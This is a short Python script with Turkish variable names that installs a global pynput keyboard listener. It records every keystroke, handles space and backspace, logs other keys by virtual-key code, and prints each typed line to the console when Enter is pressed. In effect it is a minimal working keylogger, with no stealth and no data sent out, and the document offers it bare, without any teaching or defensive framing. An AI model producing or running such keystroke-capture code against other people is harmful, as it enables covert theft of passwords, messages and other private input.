import pynput.keyboard

kelime = ""  # Global değişken

def yazdir(tus):
    global kelime
    try:
        kelime += tus.char
    except AttributeError:
        if tus == pynput.keyboard.Key.space:
            kelime += " "
        elif tus == pynput.keyboard.Key.backspace:
            kelime = kelime[:-1] if kelime else kelime
        elif tus == pynput.keyboard.Key.enter:
            print(kelime)
            kelime = ""
        elif hasattr(tus, "vk"): 
            kelime += f"<{tus.vk}>"
        else:
            print(f"Tanınmayan tuş: {tus}")

with pynput.keyboard.Listener(on_press=yazdir) as dinle:
    dinle.join()
